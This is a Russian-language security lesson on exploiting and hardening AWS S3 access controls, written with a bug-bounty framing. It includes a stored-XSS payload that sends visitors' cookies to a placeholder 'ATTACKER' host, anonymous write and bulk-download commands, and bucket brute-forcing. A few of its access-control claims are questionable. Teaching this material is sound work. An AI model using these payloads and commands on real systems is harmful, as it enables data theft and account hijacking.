---
id: cloud-s3-deep
title: "S3 глубоко: ACL, bucket policies, presigned URL и обход блокировок"
category: cloud
parent: cloud-storage-s3
difficulty: medium
order: 1
tags: [cloud, aws, s3, acl, bucket-policy, presigned-url, misconfig]
prerequisites: [cloud-storage-s3, cloud-iam-basics]
useful_for:
  - "Поиск и эксплуатация мисконфигов S3"
  - "Bug bounty: публичные бакеты и presigned URL"
  - "Понимание, почему бакет открыт"
estimated_minutes: 40
summary: "Глубокий разбор контроля доступа S3: ACL vs bucket policy, public access block, presigned URL, Object Ownership, и как обходить типовые ограничения."
---
## Зачем этот урок

Базовый урок про объектные хранилища показывает, **как найти** публичный бакет. Здесь — **почему** он публичный и как выжать максимум из тонких мисконфигов: конфликты ACL и bucket policy, ошибки в `Principal`/`Action`/`Resource`, обход Public Access Block, злоупотребление presigned URL и захват хостинга через CloudFront. Именно такие находки — читаемая запись в бакет, presigned URL на `PutObject`, устаревший публичный ACL — оплачиваются в bug bounty выше всего.

## Три уровня контроля доступа S3

1. **Bucket policy** — JSON-ресурсная политика на бакет. Имеет приоритет над ACL и может как разрешать, так и явно запрещать.
2. **ACL** — устаревший механизм grant'ов на бакет/объект (`public-read`, `public-read-write`, `authenticated-read`).
3. **IAM policy** — права идентичности (пользователя/роли). Действует вместе с ресурсной политикой.

Итоговое решение: запрос разрешён, если **хотя бы один** из трёх механизмов разрешает, и **ни один** явный `Deny` не запрещает. Явный `Deny` всегда побеждает. Это важно: наличие `Deny` в одной политике отменяет `Allow` в другой.

## Public Access Block и account-level настройки

Четыре настройки, обычно на уровне аккаунта и отдельно на уровне бакета:

- `BlockPublicAcls` — запрещает устанавливать публичные ACL.
- `IgnorePublicAcls` — игнорирует уже существующие публичные ACL.
- `BlockPublicPolicy` — запрещает применять публичные bucket policies.
- `RestrictPublicBuckets` — ограничивает доступ по публичным политикам только доверенными сервисами AWS.

Проверка:

```bash
aws s3api get-public-access-block --bucket <BUCKET>
aws s3api get-account-public-access-block
```

Ловушка: `BlockPublicPolicy=true` не «пересчитывает» старые политики автоматически. Уже опубликованная публичная policy продолжает действовать, пока её не перезапишут. Аналогично ACL: `IgnorePublicAcls=true` отключает публичные ACL **только** там, где он включён.

## Разведка бакета: полный набор команд

```bash
# Владелец, регион, настройки
aws s3api get-bucket-location --bucket <BUCKET>
aws s3api get-bucket-acl --bucket <BUCKET>
aws s3api get-bucket-policy --bucket <BUCKET>
aws s3api get-bucket-policy-status --bucket <BUCKET>
aws s3api get-bucket-ownership-controls --bucket <BUCKET>
aws s3api get-bucket-tagging --bucket <BUCKET>
aws s3api get-bucket-encryption --bucket <BUCKET>

# Анонимный доступ без кредов
curl -s "https://<BUCKET>.s3.amazonaws.com/?list-type=2"
curl -s -X PUT "https://<BUCKET>.s3.amazonaws.com/test.txt" -d "poc"
curl -s -I "https://<BUCKET>.s3.amazonaws.com/secret.env"
```

`get-bucket-policy-status` показывает `IsPublic` — прямой индикатор публичной политики. Анонимный `curl` имитирует реального неаутентифицированного пользователя и часто вскрывает то, что «в консоли выглядит закрытым».

## Bucket policy: разбор типовых ошибок

Опасные паттерны, которые надо искать глазами:

```json
{"Statement":[{"Effect":"Allow","Principal":"*","Action":["s3:GetObject","s3:PutObject"],
 "Resource":"arn:aws:s3:::victim/*"}]}
```

- `Principal: "*"` без `Condition` — доступ всем.
- `Action: "s3:*"` — включая `PutBucketPolicy` и `DeleteObject`.
- `Resource: "arn:aws:s3:::victim/*"` — на все объекты.
- `Condition` с `aws:SourceIp` без учёта прокси/VPN — обходится.
- `Condition` с `s3:prefix` без `s3:delimiter` — обход через `../`.

Ещё вариант: policy, разрешающая `ListBucket` (даёт перечисление объектов), но не `GetObject` — всё равно полезно для разведки.

## ACL и Object Ownership

AWS постепенно отключает ACL. Режим **BucketOwnerEnforced** полностью отключает ACL (все игнорируются, владелец бакета владеет объектами). Режимы **BucketOwnerPreferred** и **ObjectWriter** оставляют ACL рабочими — это и есть вектор. Проверяйте `get-bucket-ownership-controls`; если там не `BucketOwnerEnforced`, ищите grants:

```bash
aws s3api get-object-acl --bucket <BUCKET> --key <KEY>
```

## Presigned URL: жизненный цикл и злоупотребление

Presigned URL — подписанная ссылка с временным доступом. Проблемы:

- **Долгий срок** — `X-Amz-Expires` до 7 дней (604800 секунд).
- **Широкие права** — URL на `PutObject` позволяет загрузку; иногда выдан на весь префикс.
- **Утечка** — ссылка попадает в браузерную историю, Referer, аналитику, публичные репозитории, логи.

Разбор URL:

```
https://bucket.s3.amazonaws.com/key?X-Amz-Algorithm=AWS4-HMAC-SHA256
  &X-Amz-Credential=AKIA.../20240101/us-east-1/s3/aws4_request
  &X-Amz-Date=20240101T000000Z&X-Amz-Expires=604800&X-Amz-Signature=...
```

`X-Amz-Credential` содержит access key id и дату/регион подписи — полезно для атрибуции. Подпись обычно покрывает путь, поэтому менять ключ нельзя, но если подпись покрывает только префикс — возможен выход за пределы.

## Разобранный пример: запись в бакет → stored XSS через CloudFront

1. Находим бакет, доступный на чтение.
2. Читаем bucket policy (иногда публичную на чтение политики):
   ```bash
   aws s3api get-bucket-policy --bucket victim --query Policy --output text | jq .
   ```
3. Видим `PutObject` для `Principal: "*"`.
4. Пробуем запись:
   ```bash
   echo '<html><script>fetch("http://ATTACKER/"+document.cookie)</script></html>' > poc.html
   aws s3 cp poc.html s3://victim/poc.html --no-sign-request
   ```
5. Если сайт хостится из бакета через CloudFront с собственным доменом — залитый JS исполняется в браузерах посетителей (stored XSS / supply-chain).

## Регионы, endpoint'ы и Signature v4

Запрос в неправильный endpoint возвращает `301 PermanentRedirect` с заголовком `x-amz-bucket-region` — это способ определить регион анонимно. Path-style (`s3.amazonaws.com/bucket/key`) и virtual-hosted (`bucket.s3.amazonaws.com/key`) — оба надо пробовать: политики и WAF иногда различают их. Подпись AWS Signature v4 (`X-Amz-Signature`) проверяется на сервере; ошибка `SignatureDoesNotMatch` означает, что запрос дошёл до проверки подписи.

## Инструменты и автоматизация

```bash
# Перебор бакетов и путей
ffuf -u https://FUZZ.s3.amazonaws.com -w buckets.txt -mc 200,301,403
# Поиск публичных объектов
aws s3 ls s3://victim --no-sign-request --recursive | head
```

Для GCS/Azure аналоги: `gsutil ls -a gs://bucket`, `az storage blob list --container-name c --account-name a --auth-mode login`.

## Защита и аудит

- Включить все четыре настройки Public Access Block на уровне аккаунта.
- Режим Object Ownership = `BucketOwnerEnforced`.
- Запретить `Principal: "*"` в bucket policies; использовать `Condition` с точными принципалами.
- Минимизировать срок жизни presigned URL; не логировать их.
- Мониторить `s3:PutBucketPolicy`, `s3:PutBucketAcl` через CloudTrail.

## Частые ошибки

- **Пробовать только `list`.** Публичное чтение объекта не означает публичный list.
- **Забыть про регион.** Неправильный endpoint даёт 301 с правильным регионом.
- **Игнорировать presigned URL.** Это полноценный доступ, иногда дольше сессии.
- **Не проверять `--no-sign-request`.** Анонимный запрос показывает реальный доступ.
- **Считать Public Access Block абсолютной защитой.** Он не пересчитывает старые политики.

## Что делать дальше / решение

Практика: разверните бакет с публичным `GetObject`, попробуйте `--no-sign-request`, затем смоделируйте `PutObject` и hosted-XSS через CloudFront. Дальше — `cloud-storage-s3` (базовая разведка), `cloud-cdn-edge` (origin-экспозиция) и `cloud-ssrf-to-cloud` (SSRF → metadata).

## Версионирование, Object Lock и восстановление данных

Бакет с включённым **версионированием** хранит все версии объекта. Даже если объект удалён, старая версия может остаться и быть доступной по `versionId`:

```bash
aws s3api list-object-versions --bucket <BUCKET> --prefix <KEY>
curl "https://<BUCKET>.s3.amazonaws.com/<KEY>?versionId=<VID>"
```

Публичная политика на `GetObject` с `s3:GetObjectVersion` открывает доступ к удалённым данным. **Object Lock** (WORM) защищает от удаления, но не от чтения — если политика разрешает чтение, данные всё равно утекают.

## Префиксы, листинг и массовая выгрузка

`ListBucket` даёт перечисление объектов; атакуйте по префиксам, чтобы не упереться в лимит 1000 ключей:

```bash
aws s3 ls s3://<BUCKET>/ --no-sign-request --recursive | head
aws s3 sync s3://<BUCKET>/ ./loot --no-sign-request
```

Частые находки: бэкапы БД (`*.sql.gz`, `dump.tar`), `.env`, `terraform.tfstate` (в нём секреты!), конфиги с ключами, исходники. `terraform.tfstate` особенно ценен — он содержит значения всех переменных, включая пароли и токены.

## Шифрование и KMS-политики

SSE-S3 (`AES256`) прозрачно для того, кто читает. SSE-KMS требует прав `kms:Decrypt` — если роль читателя их имеет, шифрование не мешает. Проверьте `get-bucket-encryption` и, при наличии KMS, политику ключа: иногда она разрешает decrypt широкому кругу принципалов.

## Инструменты автоматизации

```bash
# Массовая проверка бакетов по списку имён
while read b; do curl -s -o /dev/null -w "%{http_code} $b\n" "https://$b.s3.amazonaws.com/?list-type=2"; done < names.txt
# Специализированные сканеры
python3 -m s3scanner scan --bucket-file names.txt
```

## Квиз

```quiz
- question: "Что приоритетнее в S3: bucket policy или ACL?"
  options:
    - "ACL всегда приоритетнее"
    - "Bucket policy приоритетнее ACL"
    - "Они не связаны"
    - "IAM приоритетнее всех"
  answer: 1
  explanation: "Ресурсная политика бакета имеет приоритет над ACL."
- question: "Какая настройка Public Access Block запрещает публикацию новых публичных политик?"
  options:
    - "IgnorePublicAcls"
    - "BlockPublicPolicy"
    - "RestrictPublicBuckets"
    - "BlockPublicAcls"
  answer: 1
  explanation: "BlockPublicPolicy запрещает применять публичные bucket policies."
- question: "Что показывает параметр X-Amz-Credential в presigned URL?"
  options:
    - "Пароль"
    - "Access key id, которым подписан URL"
    - "Регион бакета"
    - "MIME-тип"
  answer: 1
  explanation: "X-Amz-Credential содержит access key id и дату/регион подписи."
- question: "Как проверить реальный анонимный доступ к бакету?"
  options:
    - "Через консоль AWS"
    - "Запросом с --no-sign-request"
    - "Только с ключами"
    - "Через SSH"
  answer: 1
  explanation: "--no-sign-request отправляет запрос без подписи, имитируя анонимного клиента."
- question: "Почему режим Object Ownership BucketOwnerEnforced важен для защитника?"
  options:
    - "Он включает ACL"
    - "Он отключает ACL, убирая целый класс публичных мисконфигов"
    - "Он удаляет бакет"
    - "Он шифрует объекты"
  answer: 1
  explanation: "BucketOwnerEnforced полностью отключает ACL — они игнорируются."
```

## Где пригодится

- **Bug bounty** — публичные бакеты, presigned URL, утечки данных.
- **Пентест** — оценка контроля доступа к хранилищам.
- **IR/Blue team** — расследование утечек через S3.
- **DevSecOps** — аудит bucket policies и Public Access Block.
- **Сертификации** — AWS Security Specialty.
